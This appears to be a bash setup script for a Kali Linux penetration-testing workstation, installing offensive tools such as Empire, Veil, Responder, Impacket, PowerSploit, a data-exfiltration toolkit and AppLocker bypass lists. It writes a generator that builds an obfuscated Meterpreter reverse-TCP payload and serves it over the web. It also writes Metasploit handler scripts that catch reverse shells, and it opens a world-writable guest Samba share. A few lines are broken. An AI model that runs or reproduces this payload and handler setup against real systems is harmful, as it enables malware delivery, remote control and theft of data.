
##!/bin/bash
Kali Initial Build Script

#initial commands
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y


#basic installs
apt-get install python-setuptools
easy_install pip
pip install selenium
apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller nfs-acl-tools freetds-dev -y

#msfconsole.rc
#
echo "spool /mylog.log" >> /msfconsole.rc
echo "set consolelogging true" >> /msfconsole.rc
echo "set loglevel 5" >> /msfconsole.rc
echo "set sessionlogging true" >> /msfconsole.rc
echo "set timestampoutput true" >> /msfconsole.rc
echo 'setg prompt "%cya%T%grn S:%S%blu J:%J "' >> /msfconsole.rc

#sipvicious

cd /opt
git clone https://github.com/sandrogauci/sipvicious.git

#Empire

cd /opt
git clone https://github.com/PowerShellEmpire/Empire.git
#run setup manually.

#Snarf
#
apt-get install nodejs
cd /opt
git clone https://github.com/purpleteam/snarf.git

#Veil-Evasion setup
#
cd /opt
git clone https://github.com/Veil-Framework/Veil.git
git clone https://github.com/Veil-Framework/PowerTools.git
echo "[!] Don't forget at the end to run the installer manually!"

#Responder Setup
rm -r /usr/share/responder
rm /usr/bin/responder
cd /opt
git clone https://github.com/SpiderLabs/Responder.git
cd Responder
cp -r * /usr/bin

#Impacket Setup
cd /opt
git clone https://github.com/CoreSecurity/impacket.git
cd impacket
python setup.py install
cp /opt/impacket/examples/smbrelayx.py /usr/bin
chmod 755 /usr/bin/smbrelayx.py
cp /opt/impacket/examples/goldenPac.py /usr/bin
chmod 755 /usr/bin/goldenPac.py

#payload autogeneration
#
cd /opt
git clone https://github.com/trustedsec/unicorn.git
echo '#!/bin/bash' >> /payload_gen.sh
echo "ADDY=$(ifconfig eth0 | awk '/inet addr/{print $2}' | awk -F':' '{print $2}')" >> /payload_gen.sh
echo 'cd /root/payload_temp' >> /payload_gen.sh
echo 'python /opt/Veil-Evasion/Veil-Evasion.py -p python/meterpreter/rev_tcp -c compile_to_exe=Y use_pyherion=Y LHOST=$ADDY LPORT=443 --overwrite' >> /payload_gen.sh
echo 'sleep 1' >> /payload_gen.sh
echo 'mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe' >> /payload_gen.sh

#msf resource scripts
#
echo "use multi/handler" >> /bounce
echo "jobs -K" >> /bounce
echo "set payload windows/meterpreter/reverse_tcp" >> /bounce
echo "set exitonsession false" >> /bounce
echo "set lport 443" >> /bounce
echo "set enablestageencoding true" >> /bounce
echo "set autorunscript migrate -f" >> /bounce
echo "set LHOST 0.0.0.0" >> /bounce
echo "exploit -j -z" >> /bounce

echo "use multi/handler" >> /bouncessl
echo "jobs -K" >> /bouncessl
echo "set payload windows/meterpreter/reverse_https" >> /bouncessl
echo "set exitonsession false" >> /bouncessl
echo "set lhost 0.0.0.0" >> /bouncessl
echo "set lport 443" >> /bouncessl
echo "set enablestageencoding true" >> /bouncessl
echo "set autorunscript migrate -f" >> /bouncessl
echo "exploit -j -z" >> /bouncessl

#foofus OWA enum scripts
#
mkdir -p /opt/foofus
cd /opt/foofus
wget http://www.foofus.net/jmk/tools/owa/OWALogonBrute.pl
wget http://www.foofus.net/jmk/tools/owa/OWA55EnumUsersURL.pl
wget http://www.foofus.net/jmk/tools/owa/OWALightFindUsers.pl
wget http://www.foofus.net/jmk/tools/owa/OWAFindUsers.pl
wget http://www.foofus.net/jmk/tools/owa/OWAFindUsersOld.pl

#Shell_Shocker Setup
cd /opt
git clone https://github.com/mubix/shellshocker-pocs.git

# MAC ADDITIONS

#Atomic-Red-Team
cd /opt
git clone https://github.com/redcanaryco/atomic-red-team.git

#NCC's Cisco Enumeration
cd /opt
git clone https://github.com/nccgroup/cisco-SNMP-enumeration.git

#CTFR - Certificate Transparency Enumeration
cd /opt
git clone https://github.com/UnaPibaGeek/ctfr.git
cd ctft
pip3 install -r requirements.txt

#DET - Data Exfil Toolkit
cd /opt
git clone https://github.com/sensepost/DET.git
cd DET
pip install -r requirements.txt --user

#NCC Frogger
cd /opt
git clone https://github.com/nccgroup/vlan-hopping---frogger.git
mv vlan-hopping---frogger frogger
cd frogger
chmod +x frogger

#HeartBleed Script
cd /opt
git clone https://github.com/OffensivePython/HeartLeak.git

#impacket (always fun!)
cd /opt
git clone https://github.com/CoreSecurity/impacket.git
cd impacket
pip install .
pip install -r requirements_examples.txt
python setup.py

#UnixWiz NBTScan
cd /opt
mkdir nbtscan
cd nbtscan
wget http://www.unixwiz.net/tools/nbtscan-1.0.35-redhat-linux
chmod +x nbtscan-1.0.35-redhat-linux

#LyncSniper
cd /opt
https://github.com/mdsecresearch/LyncSniper.git

#MailSniper
cd /opt
git clone https://github.com/dafthack/MailSniper.git

#MorphHTA
cd /opt
git clone https://github.com/vysec/morphHTA.git

#MSDAT
cd /opt
git clone https://github.com/quentinhardy/msdat.git

#MDSEC SharpShooter - Payload Generation
cd /opt
git clone
https://github.com/mdsecactivebreach/SharpShooter.git

#Splunk Malicious Pentest App
cd /opt
git clone https://github.com/tevora-threat/splunk_pentest_app.git

#SSH Audit
cd /opt
git clone https://github.com/arthepsy/ssh-audit.git

#PowerSploit Setup
cd /opt
git clone https://github.com/mattifestation/PowerSploit.git

#Applocker Bypasses
cd /opt
git clone https://github.com/api0cradle/UltimateAppLockerByPassList.git

#PowerTools Setup
cd /opt
git clone https://github.com/Veil-Framework/PowerTools.git
cp /opt/PowerTools/PowerUp/PowerUp.ps1 /var/www
cp /opt/PowerTools/PowerView/powerview.ps1 /var/www

#Pykek Setup
cd /opt
git clone https://github.com/bidord/pykek.git

#carlos perez's asdi scripts
#
cd /opt
git clone https://github.com/darkoperator/Meterpreter-Scripts.git carlos-perez-meterpreter
cd carlos-perez-meterpreter
mkdir -p ~/.msf4/modules/post/windows/gather
cp post/windows/gather/* ~/.msf4/modules/post/windows/gather/

#autoconnect MSF db
update-rc.d postgresql enable
update-rc.d metasploit enable

#setup samba
mkdir /srv/kali
chmod 777 /srv/kali
echo "[kali]" >> /etc/samba/smb.conf
echo "        comment = Kali share" >> /etc/samba/smb.conf
echo "        path = /srv/kali" >> /etc/samba/smb.conf
echo "        browseable = yes" >> /etc/samba/smb.conf
echo "        public = yes" >> /etc/samba/smb.conf
echo "        writable = yes" >> /etc/samba/smb.conf
echo "        guest ok = yes" >> /etc/samba/smb.conf

#cleanup
#
updatedb
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y

echo
echo "[!] You also need to install Go from https://golang.org/dl/ and then run 'go get github.com/bettercap/bettercap'" 
echo "[!] You must run the setup on Empire manually at /opt/Empire and Veil at /opt/Veil"
echo "[!] Grab latest Mimikatz: https://github.com/gentilkiwi/mimikatz/releases " 
echo "[!] Grab latest Nessus Pro and BurpSuitePro too. " 
